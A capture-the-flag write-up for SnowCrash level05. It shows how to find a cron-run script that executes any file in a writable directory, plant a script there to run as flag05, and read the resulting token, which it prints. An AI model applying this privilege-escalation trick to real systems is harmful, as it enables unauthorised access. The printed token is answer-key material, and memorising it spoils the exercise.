Level05
- Cron Job ExploitationOverviewThis

level involves exploiting a scheduled cron job that automatically executes and deletes scripts from a specific directory. By placing our own script in that directory, we can execute commands with elevated privileges.Solution StepsStep 1: Find Files Owned by flag05Search for files owned by the flag05 user:

```sh
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
```

**Results:**
```
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```
Step 2: Analyze the Script
```sh
Examine the contents of /usr/sbin/openarenaserver:
```

Script content:

```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

What this script does:

1. Loops through all files in /opt/openarenaserver/
2. Executes each file with a 5-second CPU time limit
3. Deletes the file after execution

Step 3: Identify the Vulnerability
Key observations:

This script runs periodically (likely via cron)
It executes with flag05 user privileges
It runs any script placed in /opt/openarenaserver/
Scripts are deleted after execution (cleaning up evidence)

The exploit:
If we can write a script to /opt/openarenaserver/, it will be executed with elevated privileges.

Step 4: Create the Exploit Script
Navigate to the target directory and create a malicious script:

```sh
level05@SnowCrash:~$ cd /opt/openarenaserver/
level05@SnowCrash:/opt/openarenaserver$ echo '#!/bin/bash' > getflag.sh
level05@SnowCrash:/opt/openarenaserver$ echo 'getflag > /tmp/flag' >> getflag.sh
level05@SnowCrash:/opt/openarenaserver$ chmod +x getflag.sh
```

What our script does:

Executes getflag command
Redirects output to /tmp/flag (a world-readable location)

```sh
level05@SnowCrash:~$ # Wait a moment...
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

Vulnerability Explanation
Insecure Cron Job Design:

Arbitrary Code Execution: The script executes any file in the directory without validation
Writable Directory: Users can write to /opt/openarenaserver/
Elevated Privileges: The cron job runs with flag05 permissions
Auto-deletion: Files are removed, potentially hiding malicious activity

Why it's dangerous:

No input validation or file integrity checks
No whitelist of allowed scripts
Directory has overly permissive write access